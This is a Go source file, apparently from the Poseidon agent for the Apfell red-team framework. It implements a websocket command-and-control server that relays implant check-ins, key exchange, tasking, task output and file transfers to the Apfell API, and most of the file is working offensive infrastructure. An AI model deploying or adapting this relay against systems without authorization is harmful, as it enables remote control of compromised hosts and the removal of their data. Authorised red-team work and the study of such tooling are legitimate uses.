package servers

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/gorilla/websocket"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type WebsocketC2 struct {
	PollInterval int
	BaseURL      string
	BindAddress  string
	BindPort     int
	SSL          bool
	SocketURI    string
	Defaultpage  string
	Logfile      string
	Debug        bool
}

var logger *log.Logger
var upgrader = websocket.Upgrader{}

func (s WebsocketC2) NewServer() Server {
	return &WebsocketC2{}
}

//PollingInterval - Returns the polling interval
func (s WebsocketC2) PollingInterval() int {
	return s.PollInterval
}

//SetPollingInterval - Sets the polling interval
func (s *WebsocketC2) SetPollingInterval(interval int) {
	s.PollInterval = interval
}

//ApfellBaseURL - Returns the base url for apfell
func (s WebsocketC2) ApfellBaseURL() string {
	return s.BaseURL
}

//SetApfellBaseURL - Sets the base url for apfell
func (s *WebsocketC2) SetApfellBaseURL(url string) {
	s.BaseURL = url
}

func (s WebsocketC2) GetNextTask(apfellID int) []byte {
	//place holder
	url := fmt.Sprintf("%sapi/v1.2/tasks/callback/%d/nextTask", s.ApfellBaseURL(), apfellID)
	return s.htmlGetData(url)
}

func (s WebsocketC2) PostResponse(taskid int, output []byte) []byte {
	urlEnding := fmt.Sprintf("api/v1.2/responses/%d", taskid)
	return s.postRESTResponse(urlEnding, output)
}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (s *WebsocketC2) postRESTResponse(urlEnding string, data []byte) []byte {
	size := len(data)
	const dataChunk = 512000 //Normal apfell chunk size
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer

	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			//fmt.Sprintf("Error reading %s: %s", err)
			break
		}

		tResp := structs.TaskResponse{}
		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
		dataToSend, _ := json.Marshal(tResp)
		ret := s.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (s *WebsocketC2) htmlPostData(urlEnding string, sendData []byte) []byte {
	url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), urlEnding)
	//log.Println("Sending POST request to url: ", url)
	s.websocketlog(fmt.Sprintln("Sending POST request to: ", url))

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		s.websocketlog(fmt.Sprintf("Error sending POST request: %s", err.Error()))
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		s.websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		s.websocketlog(fmt.Sprintf("Error reading response body: %s", err.Error()))
		return make([]byte, 0)
	}

	return body
}

//htmlGetData - HTTP GET request for data
func (s *WebsocketC2) htmlGetData(url string) []byte {
	//log.Println("Sending HTML GET request to url: ", url)
	client := &http.Client{}
	var respBody []byte

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		s.websocketlog(fmt.Sprintf("Error creating http request: %s", err.Error()))
		return make([]byte, 0)
	}

	resp, err := client.Do(req)

	if err != nil {
		s.websocketlog(fmt.Sprintf("Error completing GET request: %s", err.Error()))
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		s.websocketlog(fmt.Sprintf("Did not receive 200 response code: %d", resp.StatusCode))
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	respBody, _ = ioutil.ReadAll(resp.Body)

	return respBody

}

func (s WebsocketC2) SendClientMessage(apfellID int, data []byte) {

}

func (s *WebsocketC2) SetDebug(debug bool) {
	s.Debug = debug
}

func (s *WebsocketC2) SetLogFile(file string) {
	s.Logfile = file
}

func (s WebsocketC2) GetDefaultPage() string {
	return s.Defaultpage
}

func (s *WebsocketC2) SetDefaultPage(newpage string) {
	s.Defaultpage = newpage
}

func (s *WebsocketC2) SetSSL(usessl bool) {
	s.SSL = usessl
}

func (s *WebsocketC2) socketHandler(w http.ResponseWriter, r *http.Request) {
	//Upgrade the websocket connection
	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		s.websocketlog(fmt.Sprintf("Websocket upgrade failed: %s\n", err.Error()))
		http.Error(w, "websocket connection failed", http.StatusBadRequest)
		return
	}

	//c := make(chan interface{})
	s.websocketlog("Received new websocket client")

	go s.manageClient(conn)

}

func (s *WebsocketC2) manageClient(c *websocket.Conn) {
	defer func() { _ = c.Close() }()
	var apfellid int

LOOP:
	for {
		// Wait for the client to send the initial checkin/EKE message
		m := Message{}
		err := c.ReadJSON(&m)

		if err != nil {
			s.websocketlog(fmt.Sprintf("Error reading from websocket %s\n. Exiting session", err.Error()))
			return
		}

		switch m.MType {
		case CheckInMsg:
			// Forward the checkin data to apfell. This data should not be encrypted
			if m.Enc {
				s.websocketlog("Warning: Received encrypted data for checkin. Exiting")
				break LOOP
			}

			resp := s.htmlPostData("api/v1.2/callbacks/", []byte(m.Data))

			// Create the msg to respond to the client
			re := Message{}
			re.Enc = false
			re.Data = base64.StdEncoding.EncodeToString(resp)
			re.MType = CheckInMsg

			// We don't need to set the ID or IDtype.

			if err = c.WriteJSON(re); err != nil {
				s.websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
				break LOOP
			}

			break

		case EKE:
			// Peform EKE with apfell
			if !m.Enc {
				s.websocketlog("Warning: Received unencrypted data for EKE. exiting")
				break LOOP
			}

			if m.IDType == UUIDType {
				// Post the RSA Pub key to apfell and return the new AES key
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/EKE/%s", m.ID), []byte(m.Data))
				if len(resp) == 0 {
					s.websocketlog("Received empty response from apfell, exiting..")
					break LOOP
				}

				re := Message{}
				re.Enc = true
				re.Data = string(resp)
				re.MType = EKE

				if err = c.WriteJSON(re); err != nil {
					s.websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			if m.IDType == SESSIDType {
				// Post the encrypted checkin data to apfell and return the checkin metadata
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/EKE/%s", m.ID), []byte(m.Data))
				if len(resp) == 0 {
					s.websocketlog("Received empty response from apfell, exiting..")
					break LOOP
				}

				re := Message{}
				re.Enc = true
				re.Data = string(resp)
				re.MType = EKE

				if err = c.WriteJSON(re); err != nil {
					s.websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			break

		case AES:
			// Facilitate the AES checkin
			if !m.Enc {
				s.websocketlog("Warning: Received unencrypted data for EKE. exiting")
				break LOOP
			}

			if m.IDType == UUIDType {
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/crypto/aes_psk/%s", m.ID), []byte(m.Data))
				if len(resp) == 0 {
					s.websocketlog("Received empty response from apfell, exiting..")
					break LOOP
				}

				re := Message{}
				re.Enc = true
				re.Data = string(resp)
				re.MType = AES

				if err = c.WriteJSON(re); err != nil {
					s.websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}
			break

		case TaskMsg:
			// Handle task request from client
			if m.IDType == ApfellIDType {
				i, _ := strconv.Atoi(m.ID)
				apfellid = i
				resp := s.GetNextTask(i)

				if len(resp) == 0 {
					s.websocketlog("Received empty response from Apfell.... retrying ")
					time.Sleep(time.Duration(s.PollingInterval()) * time.Second)

					resp = s.GetNextTask(i)
				}

				re := Message{}
				re.Data = string(resp)
				re.MType = TaskMsg

				if err = c.WriteJSON(re); err != nil {
					s.websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}

			}
			break

		case ResponseMsg:
			// Handle task responses
			if m.IDType == TASKIDType {
				i, _ := strconv.Atoi(m.ID)
				resp := s.htmlPostData(fmt.Sprintf("api/v1.2/responses/%d", i), []byte(m.Data))

				re := Message{}
				re.Data = string(resp)
				re.MType = ResponseMsg

				if err = c.WriteJSON(re); err != nil {
					s.websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			break

		case FileMsg:
			// Handle file uploads
			if m.IDType == FileIDType {
				i, _ := strconv.Atoi(m.ID)
				endpoint := fmt.Sprintf("api/v1.2/files/%d/callbacks/%d", i, apfellid)
				url := fmt.Sprintf("%s%s", s.ApfellBaseURL(), endpoint)
				resp := s.htmlGetData(url)

				re := Message{}
				re.Data = string(resp)
				re.MType = FileMsg

				if err = c.WriteJSON(re); err != nil {
					s.websocketlog(fmt.Sprintf("Error writing json to client %s", err.Error()))
					break LOOP
				}
			}

			break
		}
	}

}

func (s WebsocketC2) serveDefaultPage(w http.ResponseWriter, r *http.Request) {
	log.Println("Received request: ", r.URL)

	if r.URL.Path == "/" && r.Method == "GET" {
		// Serve the default page if we receive a GET request at the base URI
		http.ServeFile(w, r, s.GetDefaultPage())
		return
	}

	http.Error(w, "Not found", http.StatusNotFound)
	return
}

//Run - main function for the websocket profile
func (s WebsocketC2) Run() {
	f, err := os.Create("websocket.log")
	if err != nil {
		log.Println("Failed to create log file for websockets server")
		return
	}

	logger = log.New(f, "poseidon-websocket: ", log.Lshortfile|log.LstdFlags)

	// Handle requests to the base uri
	http.HandleFunc("/", s.serveDefaultPage)
	// Handle requests to the websockets uri
	http.HandleFunc(fmt.Sprintf("/%s", s.SocketURI), s.socketHandler)
}

func (s WebsocketC2) websocketlog(msg string) {
	if logger != nil {
		logger.Println(msg)
	}
}
